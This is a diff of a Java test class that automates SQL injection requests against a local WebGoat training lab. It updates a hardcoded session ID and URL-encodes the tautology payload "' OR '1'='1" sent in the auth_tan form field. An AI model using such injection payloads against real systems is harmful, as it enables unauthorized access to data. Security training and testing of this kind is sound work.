@@ -18,7 +18,7 @@ public class WebGoat8Api {
 	private String baseUrl = "http://localhost:8080";
 	private String loginEndpoint = "/WebGoat/login";
 	private String sqlInjectionEndpoint = "/WebGoat/SqlInjection/attack8";
-	private static String jsessionId = "QL8MKi4ytbAEYF9LJHeT69XdP1zn39dbpybjzq74";
+	private static String jsessionId = "dIx5xeF7tExTeBjS4I2aFvGSuMsRmql0DkZUkiMe";
 
 	@BeforeTest
 	public void setup() {
@@ -54,7 +54,7 @@ public class WebGoat8Api {
 				.header("Host", "localhost:8080").header("Referer", "http://localhost:8080/WebGoat/start.mvc")
 				.header("X-Requested-With", "XMLHttpRequest").header("Origin", "http://localhost:8080")
 				.header("Accept-Encoding", "*/*").header("Connection", "keep-alive")
-				.body("name=A&auth_tan=' OR '1'='1") // Send // the
+				.body("name=A&auth_tan='+OR+'1'%3D'1") // Send // the
 														// payload
 														// as
 														// raw
@@ -69,7 +69,7 @@ public class WebGoat8Api {
 		// Send SQL injection request with logging
 		given().log().all() // Log request and response
 				.cookie("JSESSIONID", jsessionId).header("Content-Type", "application/x-www-form-urlencoded")
-				.body("name=&auth_tan=' OR '1'='1") // Send
+				.body("name=&auth_tan='+OR+'1'%3D'1") // Send
 														// the
 														// payload
 														// as
